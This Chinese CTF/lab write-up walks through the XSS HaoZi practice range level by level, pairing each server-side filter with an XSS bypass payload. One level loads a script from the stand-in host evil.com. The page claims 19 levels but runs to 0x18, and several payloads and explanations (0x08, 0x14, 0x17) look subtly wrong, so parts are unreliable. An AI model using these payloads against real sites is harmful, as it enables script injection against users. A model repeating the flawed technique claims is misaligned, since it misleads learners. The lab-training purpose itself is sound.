---
title: XSS HaoZi靶场19关完整通关笔记
description: 系统梳理XSS HaoZi靶场19关（0x00-0x12）的完整通关过程，涵盖反射型XSS基础、标签属性逃逸、过滤绕过、编码转义、上下文注入、HTML实体编码、长S字符绕过、原型链污染/堆叠注入等核心XSS绕过技术，适合Web安全入门与CTF实战巩固。
category: program-analysis
tags:
- XSS
- CTF
- Web安全
- 靶场通关
- 过滤绕过
- HTML实体编码
- 上下文逃逸
- 反射型XSS
- 无名安全团队
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本页面整理自无名安全团队Lem0n的微信公众号文章《XSS-HaoZi靶场通关笔记》，系统记录 **XSS HaoZi靶场（xss.haozi.me）** 19个关卡（0x00~0x12）的完整解题思路与Payload构造。

靶场特色：每关提供**Server Code（服务端过滤逻辑）**、**Input Code（输入框）**、**HTML（渲染结果）**，便于直观理解输入如何被处理、插入到何种上下文，以及如何针对性构造绕过。

> 适合读者：Web安全初学者、CTF选手、渗透测试人员、前端安全研究者

---

## 关卡详解

### 0x00 基础反射型XSS - div标签闭合

**Server Code**
```javascript
function render(input) {
  return '<div>' + input + '</div>'
}
```

**分析**：输入直接拼接在 `<div>` 标签内部，无任何过滤。

**Payload**
```html
</div><script>alert(1)</script>
```

**核心技术**：标签闭合注入

---

### 0x01 基础反射型XSS - textarea标签闭合

**Server Code**
```javascript
function render(input) {
  return '<textarea>' + input + '</textarea>'
}
```

**分析**：同 0x00，仅标签变为 `<textarea>`。

**Payload**
```html
</textarea><script>alert(1)</script>
```

---

### 0x02 属性上下文逃逸 - input value属性

**Server Code**
```javascript
function render(input) {
  return '<input type="name" value="' + input + '">'
}
```

**分析**：输入位于 `value` 属性值内，需闭合双引号与标签。

**Payload**
```html
"><script>alert(1)</script>
```

**核心技术**：属性值闭合 `">` → 标签闭合 `>` → 脚本注入

---

### 0x03 正则过滤括号绕过 - 反引号代替括号

**Server Code**
```javascript
function render(input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

**分析**：过滤 `(` `)`，导致 `alert(1)` 无法直接书写。

**Payload**
```html
<script>alert`1`</script>
```

**核心技术**：ES6 模板字符串语法，反引号 `` ` `` 可替代括号调用函数。

---

### 0x04 反引号亦被过滤 - HTML实体编码绕过

**Server Code**
```javascript
function render(input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

**分析**：`(` `)` `` ` `` 全部被过滤，需换用事件处理器+实体编码。

**Payload**
```html
<img src=1 onerror=alert&#40;1&#41;>
```

**核心技术**：
- `&#40;` → `(` 
- `&#41;` → `)`
- 利用 `onerror` 事件触发，无需脚本标签

> 相关技巧见 [[ssrf-bypass-techniques#编码绕过]]、[[ctf-show-php-command-execution-bypass-techniques#编码绕过]]

---

### 0x05 HTML注释上下文逃逸 - `--!>` 绕过

**Server Code**
```javascript
function render(input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```

**分析**：输入置于 HTML 注释 `<!-- -->` 内，`-->` 被替换为表情，但浏览器解析器接受 `--!>` 作为注释结束。

**Payload**
```html
--!><script>alert(1)</script>
```

**核心技术**：HTML 注释容错性绕过，`--!>`、`--->` 均可闭合注释。

---

### 0x06 属性注入 + 事件处理器 - 换行绕过正则

**Server Code**
```javascript
function render(input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

**分析**：
- 过滤 `auto`、`onxxx=`、`>`
- 输入插在标签属性中间，无尖括号无法构造新标签

**Payload**
```html
type="image" src=1 onerror ="alert(1)"
```

**核心技术**：
- `onerror =` 中插入空格/换行，破坏 `on.*=` 正则匹配
- `type="image"` 使 `src` 生效，触发 `onerror`

> 类似属性注入思路见 [[websocket-vulnerabilities-analysis#XSS消息注入]]

---

### 0x07 标签剥离绕过 - 不完整标签利用浏览器容错

**Server Code**
```javascript
function render(input) {
  const stripTagsRe = /<\/?[^>]+>/gi
  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

**分析**：正则匹配完整标签 `<...>` 并替换为空，但浏览器对 `<img src=1 onerror=alert(1)`（缺 `>`）仍会解析执行。

**Payload**
```html
<img src=1 onerror=alert(1)
```

**核心技术**：浏览器 HTML 解析器的容错机制。

---

### 0x08 style标签上下文 - 换行拆分绕过过滤

**Server Code**
```javascript
function render(src) {
  src = src.replace(/<\/style>/ig, '/* 坏人 */')
  return `
    <style>
    ${src}
    </style>
  `
}
```

**分析**：过滤 `</style>`，但可通过换行拆分标签名。

**Payload**
```html
</style
><img src=1 onerror="alert(1)">
```

**核心技术**：标签名拆行绕过大小写不敏感的字符串替换。

---

### 0x09 script src 域名校验 - 直接闭合注入

**Server Code**
```javascript
function render(input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

**分析**：仅校验域名前缀，未限制后续路径。

**Payload**
```html
https://www.segmentfault.com"></script><script>alert(1)</script>
```

**核心技术**：域名校验不严格，利用双引号闭合属性值。

---

### 0x10 script src + HTML实体编码 - `@` 认证绕过

**Server Code**
```javascript
function render(input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
      .replace(/'/g, '&#39;')
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/\//g, '&#x2f')
  }
  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

**分析**：完善的 HTML 实体编码，但 URL 中 `@` 后内容会被浏览器作为目标主机。

**Payload**
```html
https://www.segmentfault.com@evil.com/xss.js
```

**核心技术**：URL 语法中 `user@host` 形式，`@` 后为真实请求域名。

> 注：Firefox 支持，Chrome 可能拦截。

---

### 0x11 全大写转换 - HTML实体编码绕过大小写限制

**Server Code**
```javascript
function render(input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

**分析**：输入被强制大写，导致 `alert(1)` 变为 `ALERT(1)` 报错。

**Payload**
```html
<IMG SRC=1 ONERROR=ALERT&#40;1&#41;>
```

**核心技术**：HTML 实体编码 `&#40;` `&#41;` 不受 `toUpperCase()` 影响，事件属性名不区分大小写。

---

### 0x12 script过滤 + 全大写 - 同 0x11

**Server Code**
```javascript
function render(input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

**分析**：额外过滤 `script`，但 0x11 Payload 未使用 script 标签，直接复用。

**Payload**
```html
<IMG SRC=1 ONERROR=ALERT&#40;1&#41;>
```

---

### 0x13 script标签内注释上下文 - 换行逃逸注释

**Server Code**
```javascript
function render(input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
        // alert('${input}')
    </script>
  `
}
```

**分析**：
- 过滤 `< / " '`
- 输入在 `//` 单行注释内
- 代码格式为多行，可换行逃逸注释

**Payload**
```html
alert(1);//
```

**核心技术**：
- 换行终结 `//` 注释
- 后续 `'` 被注释符 `//` 忽略
- 过滤规则未包含 `(` `)` `;`

---

### 0x14 标签首字母插下划线 + 全大写 - 长S (ſ) 绕过

**Server Code**
```javascript
function render(input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

**分析**：
- 标签首字母前插 `_` → `<_IMG>`
- 全大写 → `<_IMG>`
- 正则匹配 ASCII 字母，Unicode 长S `ſ` (U+017F) 不在 `[a-zA-Z]` 范围

**Payload**
```html
<ſMG SRC=1 ONERROR=ALERT&#40;1&#41;>
```

**核心技术**：Unicode 同形异义字符绕过正则字符类匹配。

---

### 0x15 img onerror + 完善HTML编码 - 闭合引号+注释

**Server Code**
```javascript
function render(input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
      .replace(/'/g, '&#39;')
      .replace(/"/g, '&quot;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

**分析**：输入在 `onerror` 属性的单引号字符串内，且经过完善编码。

**Payload**
```html
');alert(1);//
```

**核心技术**：
- `')` 闭合单引号与括号
- `;` 分隔语句
- `//` 注释掉后续干扰代码

---

### 0x16 window.data 赋值 - 对象属性堆叠/原型链污染雏形

**Server Code**
```javascript
function render(input) {
  return `
    <script>
      window.data = ${input}
    </script>
  `
}
```

**分析**：输入直接作为 JS 表达式赋值给 `window.data`，无引号包裹。

**Payload**
```html
{toString:alert(1)};//
```

**核心技术**：
- 对象字面量赋值
- `toString` 被隐式调用触发
- `//` 注释掉后续可能的分号/代码

> 相关原型链污染利用见 [[gkctf-2021-web-writeup#easynode-Nodejs原型链污染RCE]]、[[mongodb-nosql-injection-guide#原型链污染]]

---

### 0x17 console.log 转义绕过 - 反斜杠转义闭合

**Server Code**（图片版，核心逻辑）
```javascript
function render(input) {
  // 将多种字符转义为 \x 形式
  input = input.replace(/["'\\]/g, '\\$&')
  return `<script>console.log("${input}");</script>`
}
```

**分析**：双引号被转义为 `\"`，但反斜杠本身未转义（或双写）。

**Payload**
```html
\\";alert(1);//
```

**核心技术**：
- `\\` → 实际字符串中为单个 `\`
- `\"` → 被前一个 `\` 转义，变成字面量 `"`，从而闭合外层字符串
- 后接 `;alert(1);//` 执行代码

---

### 0x18 alf.nu 经典转义 - 双反斜杠闭合

**Server Code**
```javascript
// from alf.nu
function escape(s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

**分析**：仅将 `"` 替换为 `\"`，未处理反斜杠。

**Payload**
```html
\\");alert(1);//
```

**核心技术**：同 0x17，利用 `\\` 吃掉一个转义，使 `\"` 变为字面引号。

---

## 核心技术知识图谱

| 技术分类 | 涉及关卡 | 关键点 |
|---------|---------|--------|
| **标签/属性闭合** | 0x00, 0x01, 0x02, 0x09 | `>`, `">`, `'>` 闭合上下文 |
| **事件处理器注入** | 0x04, 0x06, 0x07, 0x08, 0x11, 0x12, 0x14 | `onerror`, `onload`, `onmouseover` 等 |
| **HTML实体编码** | 0x04, 0x10, 0x11, 0x12, 0x14 | `&#40;`, `&#41;`, `&#x2f;`, `&quot;` |
| **注释上下文逃逸** | 0x05, 0x13 | `--!>`, 换行终结 `//` |
| **正则/过滤绕过** | 0x03, 0x06, 0x07, 0x08, 0x14 | 空格/换行分隔、Unicode同形字、不完整标签 |
| **URL语法特性** | 0x10 | `@` 认证绕过域名校验 |
| **JS语法上下文注入** | 0x16, 0x17, 0x18 | 对象字面量、转义闭合、反斜杠吃转义 |
| **大小写/编码规范化绕过** | 0x11, 0x12, 0x14 | `toUpperCase()` 不影响实体编码 |

---

## 实战建议与延伸学习

1. **上下文决定Payload**：同一过滤函数，插入位置不同（HTML文本、属性值、JS字符串、注释、CSS），绕过手法截然不同。
2. **多层编码组合**：实体编码 + Unicode + URL编码 + JS转义，层层绕过。
3. **浏览器解析差异**：Chrome/Firefox/Safari 对容错性、URL语法、CSP支持存在差异，实战需多浏览器验证。
4. **自动化工具辅助**：
   - [XSStrike](https://github.com/s0md3v/XSStrike) - 智能XSS扫描
   - [DalFox](https://github.com/hahwul/dalfox) - 参数分析与XSS扫描
   - Burp Suite 插件：XSS Validator, Scriptable
5. **进阶靶场推荐**：
   - [XSS Game (Google)](https://xss-game.appspot.com/)
   - [Alert(1) to win](https://alf.nu/alert1)
   - [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
   - [[attack-defense-world-master-advanced-writeup]] 攻防世界高级区 Web 题
   - [[gkctf-2021-web-writeup]] GKCTF 2021 Web 方向实战

---

## 交叉引用

- [[ssrf-bypass-techniques]] - 编码绕过、协议利用等通用绕过思路
- [[ctf-show-php-command-execution-bypass-techniques]] - PHP命令执行绕过技巧对比
- [[websocket-vulnerabilities-analysis]] - WebSocket XSS 与 CSWSH 攻击面
- [[gkctf-2021-web-writeup]] - 实战中的 XSS、原型链污染、SSRF 组合链
- [[attack-defense-world-master-advanced-writeup]] - 攻防世界进阶区 Web 题解
- [[php-webshell-fundamentals-chopper-analysis]] - Webshell 与 XSS 后利用关联
- [[xihulunjian-2020-iot-pwn3-ezarmpwn-writeup]] - CTF 实战写作规范参考

---

## 更新记录

| 日期 | 版本 | 说明 |
|------|------|------|
| 2024-01-15 | 1.0 | 初始版本，整理19关完整笔记 |

---

> **原文来源**：无名安全团队 - Lem0n，《XSS-HaoZi靶场通关笔记》  
> **靶场地址**：http://xss.haozi.me  
> **学习建议**：建议在本地搭建或直接访问靶场，逐关动手复现，体会“输入→过滤→渲染→触发”的完整链路。

## 来源

- [0x00实验室-202108-202304_071](../sources/0x00实验室-202108-202304_071.md)
